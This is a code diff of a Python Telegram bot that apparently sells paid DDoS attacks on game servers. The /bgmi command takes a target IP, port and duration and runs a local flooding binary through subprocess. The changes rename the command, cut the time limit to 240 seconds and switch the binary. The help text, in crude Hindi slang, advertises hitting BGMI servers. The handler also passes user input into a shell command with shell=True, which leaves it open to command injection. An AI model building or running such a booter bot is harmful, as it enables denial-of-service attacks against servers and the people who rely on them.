@@ -274,7 +274,7 @@ COOLDOWN_TIME =0
 attack_running = False
 
 # Handler for /attack command
-@bot.message_handler(commands=['vivek'])
+@bot.message_handler(commands=['bgmi'])
 def handle_attack(message):
     global attack_running
 
@@ -291,17 +291,17 @@ def handle_attack(message):
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
 
-            if time > 300:
-                response = "Error: Time interval must be less than 300"
+            if time > 240:
+                response = "Error: Time interval must be less than 240"
             else:
                 attack_running = True  # Set the attack state to running
                 try:
-                    record_command_logs(user_id, '/vivek', target, port, time)
+                    record_command_logs(user_id, '/bgmi', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./2112 {target} {port} {time} 800"
+                    full_command = f"./2111 {target} {port} {time} 900"
                     subprocess.run(full_command, shell=True)
 
                     response = "Attack completed successfully."
@@ -310,7 +310,7 @@ def handle_attack(message):
                 finally:
                     attack_running = False  # Reset the attack state
         else:
-            response = "Usage: /vivek <target> <port> <time>"
+            response = "Usage: /bgmi <target> <port> <time>"
     else:
         response = "ACCESS TOH LELE FREE mai kuch nahi milega FREE mai shrif ghnta milega lega toh bata ."
 
@@ -343,7 +343,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''
-💥 /vivek : 😫BGMI WALO KE SERVER KO CHODO🥵. 
+💥 /bgmi : 😫BGMI WALO KE SERVER KO CHODO🥵. 
 💥 /rules : 📒GWAR RULES PADHLE KAM AYEGA📒 !!.
 💥 /mylogs : 👁️SAB CHUDAI DEKHO👁️.
 💥 /plan : 💵SABKE BSS KA BAT HAI💵.
